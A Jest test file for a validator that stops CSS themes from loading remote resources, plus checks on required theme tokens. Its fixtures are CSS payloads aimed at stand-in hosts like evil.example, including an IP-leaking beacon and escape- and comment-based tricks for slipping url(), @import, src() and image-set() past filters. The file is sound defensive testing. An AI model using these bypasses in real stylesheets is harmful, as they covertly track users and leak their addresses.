import { MAX_THEME_CSS_SIZE, validateThemeCss } from './validate-theme-css.util';

/**
 * A CSS string that satisfies all required + recommended tokens in
 * THEME_CONTRACT — used to keep individual test cases focused on the bit
 * they're testing instead of restating every required token in every test.
 */
const completeContractCss = `
body {
  --surface-1: #fff;
  --surface-2: #fff;
  --surface-0: #eee;
  --surface-3: #fff;
  --surface-4: #fff;
  --ink: #000;
  --ink-on-channel: 0,0,0;
  --ink-strong: #000;
  --ink-muted: rgba(0,0,0,0.6);
  --separator: #ccc;
  --divider: rgba(0,0,0,0.12);
  --scrim: rgba(0,0,0,0.6);
}
`;

describe('validateThemeCss', () => {
  it('accepts CSS without any url() or @import', () => {
    const result = validateThemeCss(':root { --bg: #111; }');
    expect(result.isValid).toBe(true);
    expect(result.errors).toEqual([]);
  });

  it('accepts in-document url(#fragment) references', () => {
    const result = validateThemeCss('rect { fill: url(#myGradient); }');
    expect(result.isValid).toBe(true);
  });

  it('rejects http url(...)', () => {
    const result = validateThemeCss('a { background: url(http://e.com/x.png); }');
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/remote/);
  });

  it('rejects https url(...)', () => {
    const result = validateThemeCss('a { background: url("https://e.com/x.png"); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects protocol-relative url(...)', () => {
    const result = validateThemeCss('a { background: url(//e.com/x.png); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects @import "..." with absolute URL', () => {
    const result = validateThemeCss('@import "https://evil/x.css";');
    expect(result.isValid).toBe(false);
  });

  it('rejects @import url(...) with absolute URL', () => {
    const result = validateThemeCss('@import url("http://evil/x.css");');
    expect(result.isValid).toBe(false);
  });

  it('rejects every @import, including fragment-only forms', () => {
    expect(validateThemeCss('@import "#theme";').isValid).toBe(false);
    expect(validateThemeCss('@import url(#theme);').isValid).toBe(false);
  });

  it('rejects @import text conservatively even when decode makes it look quoted', () => {
    expect(validateThemeCss('a::before { content: "@import"; }').isValid).toBe(false);
    expect(
      validateThemeCss('@layer \\22 ; @import "https://evil.example/x.css";').isValid,
    ).toBe(false);
  });

  it('rejects relative url(...) (no bundled assets in v1)', () => {
    const result = validateThemeCss('a { background: url("./assets/x.png"); }');
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/bundled assets/);
  });

  it('rejects data: URIs', () => {
    const result = validateThemeCss(
      'a { background: url("data:image/png;base64,abc"); }',
    );
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/data:/);
  });

  it('rejects commented-out url(...) text conservatively', () => {
    const result = validateThemeCss('/* a { background: url(http://e.com); } */');
    expect(result.isValid).toBe(false);
  });

  it('rejects CSS exceeding the size cap', () => {
    const big = 'a {} '.repeat(MAX_THEME_CSS_SIZE);
    const result = validateThemeCss(big);
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/too large/);
  });

  it('records line numbers in error messages', () => {
    const css = ':root {}\n\na { background: url(https://evil/x); }';
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/Line 3/);
  });

  // --- Unterminated url()/src() at end-of-input ---

  it('rejects an unterminated url( at end-of-input (fetches as a url-token)', () => {
    // The CSS tokenizer emits a fetchable url-token at EOF even without the
    // closing `)`, so a theme that simply ends mid-url beacons on every load.
    // The argument regex needs the `)`, so this must be caught separately.
    for (const css of [
      'body{background-image:url(http://evil/beacon?ip=leak',
      'body{background-image:url("http://evil/q',
      'a{background:url("http://evil/q"',
      '@font-face{src:src(http://evil/x',
    ]) {
      const result = validateThemeCss(css);
      expect(result.isValid).toBe(false);
      expect(result.errors.join(' ')).toMatch(/unterminated/i);
    }
  });

  it('still accepts a normally-closed url() near end-of-input', () => {
    expect(validateThemeCss('rect{fill:url(#g)}').isValid).toBe(true);
    expect(validateThemeCss('a{background:url(#g)}').isValid).toBe(true);
  });

  it('reports the line of an unterminated url( that is not at the first line', () => {
    const result = validateThemeCss(':root {}\n\nbody{background:url(http://evil/x');
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/Line 3/);
  });

  // --- CSS escape bypass tests (C1) ---

  it('rejects \\75rl(...) — `url` with escaped first char', () => {
    const result = validateThemeCss('a { background: \\75rl(http://e.com/x); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects u\\72l(...) — `url` with escaped middle char', () => {
    const result = validateThemeCss('a { background: u\\72l(https://e.com/x); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects url and import keywords split by a CRLF-terminated hex escape', () => {
    expect(
      validateThemeCss('a{background:u\\72\r\nl(https://evil.example/x.png)}').isValid,
    ).toBe(false);
    expect(validateThemeCss('@\\69\r\nmport "https://evil.example/x.css";').isValid).toBe(
      false,
    );
  });

  it('rejects \\55RL(...) — uppercase mixed-case escapes', () => {
    const result = validateThemeCss('a { background: \\55RL(https://e.com/x); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects @\\69mport "http://x" — escaped @import', () => {
    const result = validateThemeCss('@\\69mport "http://evil/x.css";');
    expect(result.isValid).toBe(false);
  });

  it('rejects url("https\\3a //evil/x") — escaped colon inside url', () => {
    const result = validateThemeCss('a { background: url("https\\3a //evil/x"); }');
    expect(result.isValid).toBe(false);
  });

  it('does not crash on benign escapes like content: "\\41"', () => {
    const result = validateThemeCss('a::before { content: "\\41"; }');
    expect(result.isValid).toBe(true);
  });

  // --- Conservative unstripped security-scan tests ---

  it('rejects a live URL surrounded by comment-like string content', () => {
    // Security checks inspect the decoded, unstripped source, so apparent
    // strings cannot swallow a later fetch-bearing function.
    const css = `a::before { content: "/*"; } a { background: url(http://evil) } a::after { content: "*/"; }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/remote/);
  });

  it('rejects a live URL after an escaped quote inside a string', () => {
    const css = `a::before { content: "say \\"hi\\""; } a { background: url(http://evil) }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
  });

  // --- Conservative @import scan tests ---

  it('rejects @import with a comment between the keyword and the URL', () => {
    // Installed themes reject the at-rule keyword itself, independent of
    // comment placement or the imported target.
    const result = validateThemeCss('@import/**/"http://evil/x.css";');
    expect(result.isValid).toBe(false);
  });

  it('rejects @import with a comment after escape-encoded keyword', () => {
    const result = validateThemeCss('@\\69mport/**/"http://evil/x.css";');
    expect(result.isValid).toBe(false);
  });

  // --- url-token comment-bypass tests ---

  it('rejects comment-like text inside unsupported URLs conservatively', () => {
    const css = `a{background:url(/*)}`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
    expect(result.errors.join(' ')).toMatch(/unterminated/i);
  });

  it('rejects unterminated /* (no closing comment) as malformed CSS', () => {
    // An unterminated comment + a remote url() is the simplest variant of
    // the swallow-to-EOF attack.
    const result = validateThemeCss('/* unterminated url(http://evil/x)');
    expect(result.isValid).toBe(false);
    expect(result.errors.join(' ')).toMatch(/unterminated/i);
  });

  it('rejects a raw unterminated comment after an escape-created quote', () => {
    const result = validateThemeCss(String.raw`\22 /*`);
    expect(result.isValid).toBe(false);
    expect(result.errors.join(' ')).toMatch(/unterminated/i);
  });

  it('rejects raw unterminated comments after literal escaped quotes', () => {
    for (const css of [String.raw`\" /*`, String.raw`\' /*`]) {
      const result = validateThemeCss(css);
      expect(result.isValid).toBe(false);
      expect(result.errors.join(' ')).toMatch(/unterminated/i);
    }
  });

  it('rejects raw unterminated comments after bad-string newlines', () => {
    for (const css of ['"bad\n/*', "'bad\r/*", 'a{content:"bad\f/*']) {
      const result = validateThemeCss(css);
      expect(result.isValid).toBe(false);
      expect(result.errors.join(' ')).toMatch(/unterminated/i);
    }
  });

  it('keeps escaped CRLF line continuations inside raw strings', () => {
    const result = validateThemeCss('a{content:"bad\\\r\n/*"}');
    expect(result.isValid).toBe(true);
  });

  it('keeps escape-created newlines inside decoded strings', () => {
    const result = validateThemeCss(String.raw`a{content:"\a /*"}`);
    expect(result.isValid).toBe(true);
  });

  it('does not let generic function names suppress raw comment validation', () => {
    for (const css of ['myurl(/*', 'curl(/*', '-url(/*']) {
      const result = validateThemeCss(css);
      expect(result.isValid).toBe(false);
      expect(result.errors.join(' ')).toMatch(/unterminated/i);
    }
  });

  it('rejects escape-encoded url keyword that hides the url-token', () => {
    // Decode-before-validation makes `u\72l(` a normal url-token before both
    // malformed-comment validation and the security scan.
    const css = `a{background:u\\72l(/*)} b{background:url(http://evil/x)}`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
  });

  it('rejects live URLs hidden between escape-created fake comment delimiters', () => {
    const css = String.raw`:root{--x:\2f\2a ;}a{background:url(https://evil.example/x.png)}:root{--y:\2a\2f;}`;
    expect(validateThemeCss(css).isValid).toBe(false);
  });

  it('rejects remote URL schemes joined by a string line continuation', () => {
    for (const newline of ['\n', '\r', '\r\n', '\f']) {
      const css = `a{background:url("ht\\${newline}tps://evil.example/x")}`;
      const result = validateThemeCss(css);
      expect(result.isValid).toBe(false);
      expect(result.errors.join(' ')).toMatch(/remote/i);
    }
  });

  // --- src() function bypass tests (CSS Fonts L4) ---

  it('rejects src(<remote>) in @font-face — modern CSS Fonts L4 form', () => {
    const css = `@font-face{font-family:x;src:src("https://evil.example/track");}`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/remote/);
  });

  it('rejects bare src(<remote>) outside @font-face', () => {
    const result = validateThemeCss('a { background: src(http://evil/x); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects relative src(<path>) (no bundled assets in v1)', () => {
    const result = validateThemeCss(
      `@font-face{font-family:x;src:src("./fonts/x.woff2");}`,
    );
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/bundled assets/);
  });

  it('rejects escape-encoded src keyword', () => {
    // `\72\63` decodes to `r` + `c` after decodeCssEscapes, so `s\72\63(`
    // becomes `src(` and the src() regex catches it. (Using `\72c` won't
    // work — the hex matcher is greedy and parses `72c` as one codepoint.)
    const css = `@font-face{font-family:x;src:s\\72\\63("https://evil/x");}`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
  });

  it('does not match the `src:` property keyword (only the src() function)', () => {
    // The regex requires `(`, not `:`. A traditional @font-face that uses
    // url() (already rejected by the url scan as remote) should not be
    // double-flagged by the src scan.
    const css = `@font-face{font-family:x;src:url(http://evil/x);}`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(false);
    // Only one error from the url scan, not one each from url and src.
    expect(result.errors.length).toBe(1);
  });

  // --- image-set() function bypass tests (CSS Images L4) ---

  it('rejects image-set("<remote>") — string form', () => {
    const result = validateThemeCss(
      'a { background: image-set("https://evil.example/track.png" 1x); }',
    );
    expect(result.isValid).toBe(false);
    expect(result.errors[0]).toMatch(/not supported/);
  });

  it('rejects bare image-set(<remote> 1x)', () => {
    const result = validateThemeCss('a { background: image-set(http://evil/x 1x); }');
    expect(result.isValid).toBe(false);
  });

  it('rejects image-set(url(<remote>) 1x) — inner url() is also caught', () => {
    // The inner url() is caught by the url() scan; this test locks in the
    // coverage so a future regex change can't silently drop it.
    const result = validateThemeCss(
      'a { background: image-set(url(http://evil/x) 1x); }',
    );
    expect(result.isValid).toBe(false);
  });

  it('rejects image-set(var(...)) because substitution can reveal a URL string', () => {
    const result = validateThemeCss(`
      :root { --remote-image: "https://evil.example/track.png"; }
      a { background: image-set(var(--remote-image) 1x); }
    `);
    expect(result.isValid).toBe(false);
  });

  it('rejects image() sources, including custom-property substitution', () => {
    expect(
      validateThemeCss('a { background: image("https://evil.example/x.png"); }').isValid,
    ).toBe(false);
    expect(
      validateThemeCss(`
        :root { --remote-image: "https://evil.example/x.png"; }
        a { background: image(var(--remote-image)); }
      `).isValid,
    ).toBe(false);
  });

  it('rejects image functions conservatively even when decode makes them look quoted', () => {
    expect(
      validateThemeCss('a::before { content: "image(https://example.com)"; }').isValid,
    ).toBe(false);
    expect(
      validateThemeCss(
        'a{--x:\\22 ;background:image-set("https://evil.example/x.png" 1x)}',
      ).isValid,
    ).toBe(false);
  });

  it('rejects image-set URLs whose escaped quote breaks decoded parsing', () => {
    const css = String.raw`a{background:image-set("https://evil.example/x\22 .png" 1x)}`;
    expect(validateThemeCss(css).isValid).toBe(false);
  });

  it('rejects image-set(linear-gradient(...)) because the function is unsupported', () => {
    const result = validateThemeCss(
      'a { background: image-set(linear-gradient(red, blue) 1x); }',
    );
    expect(result.isValid).toBe(false);
  });

  // --- Keyword bans are exempt inside comments (but not strings) ---

  it('allows @import / image() / image-set() keyword text inside comments', () => {
    // These bans have no fetchable argument to classify, so a genuine comment
    // mentioning them (e.g. a theme documenting the restriction) is not a rule
    // and must not eject the theme on install or on re-validation at load.
    for (const css of [
      '/* do not use @import in themes */ body{--surface-1:#000}',
      '/* pick an image (large) then crop */ body{--surface-1:#000}',
      '/* image-set() is unsupported here */ body{--surface-1:#000}',
    ]) {
      expect(validateThemeCss(css).isValid).toBe(true);
    }
  });

  it('still rejects real @import / image() / image-set() sitting next to a comment', () => {
    for (const css of [
      '/* note */ @import "https://evil.example/x.css";',
      '/* note */ a{background:image("https://evil.example/x.png")}',
      '/* note */ a{background:image-set("https://evil.example/x.png" 1x)}',
    ]) {
      expect(validateThemeCss(css).isValid).toBe(false);
    }
  });

  // --- THEME_CONTRACT presence-only warning tests ---

  it('warns when a required primitive is missing entirely', () => {
    const css = `body { --surface-1: #fff; --surface-2: #fff; --ink: #000; }`;
    // `--ink-on-channel` is missing — required tier.
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--ink-on-channel')).toBe(true);
  });

  it('does NOT warn when a token is declared anywhere — presence-only semantics', () => {
    // Declared at :root (ineffective at runtime because the body-scoped base
    // declarations win, but the v1 validator is presence-only and does not
    // parse selectors). This locks the documented behavior in place.
    const css = completeContractCss.replace('body {', ':root {');
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    expect(result.warnings).toBeUndefined();
  });

  it('warns when only recommended tokens are missing', () => {
    // Has all four required tokens; missing all recommended ones (e.g. --surface-0).
    const css = `body {
      --surface-1: #fff;
      --surface-2: #fff;
      --ink: #000;
      --ink-on-channel: 0,0,0;
    }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    // None of the four required tokens are missing.
    expect(
      result.warnings?.some((w) =>
        ['--surface-1', '--surface-2', '--ink', '--ink-on-channel'].includes(w.token),
      ),
    ).toBe(false);
    // At least one recommended token (e.g. --surface-0) is missing.
    expect(result.warnings?.some((w) => w.token === '--surface-0')).toBe(true);
  });

  it('omits warnings entirely when CSS is invalid', () => {
    // Validator rejects the URL → no token warnings should be appended on top.
    const result = validateThemeCss('a { background: url(http://evil/x); }');
    expect(result.isValid).toBe(false);
    expect(result.warnings).toBeUndefined();
  });

  it('flags commented-out token declarations as missing', () => {
    // Comment-stripper collapses comments to whitespace before the contract
    // scan runs, so `/* --surface-1: #fff; */` is invisible to the regex.
    const css = `body {
      /* --surface-1: #fff; */
      --surface-2: #fff;
      --ink: #000;
      --ink-on-channel: 0,0,0;
    }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--surface-1')).toBe(true);
  });

  it('recognizes escape-encoded token names after decode', () => {
    // `\69` is `i`, `\6e` is `n`. Trailing space (or another non-hex char)
    // terminates the hex run so `\69 ` decodes to `i`. Result: `--\69 nk`
    // becomes `--ink` BEFORE the contract scan runs (decode-then-strip
    // pipeline). Confirms the scan reuses the already-decoded `stripped`
    // value rather than re-running decode.
    const css = `body {
      --surface-1: #fff;
      --surface-2: #fff;
      --\\69 nk: #000;
      --ink-on-channel: 0,0,0;
    }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--ink')).toBe(false);
  });

  it('does not treat `--token:` inside string literals as a declaration', () => {
    // Strings stay intact through comment-stripping (the URL classifier needs
    // them) but the contract scanner must look past them — otherwise a
    // `content: "--surface-1:"` declaration would silently suppress the
    // missing-token warning. Same for url-token contents (using `#fragment`
    // form so the URL classifier accepts the path).
    const css = `body {
      content: "--surface-1: nope";
      background: url(#--ink:foo);
      --surface-2: #fff;
      --ink-on-channel: 0,0,0;
    }`;
    const result = validateThemeCss(css);
    expect(result.isValid).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--surface-1')).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--ink')).toBe(true);
    expect(result.warnings?.some((w) => w.token === '--surface-2')).toBe(false);
  });
});
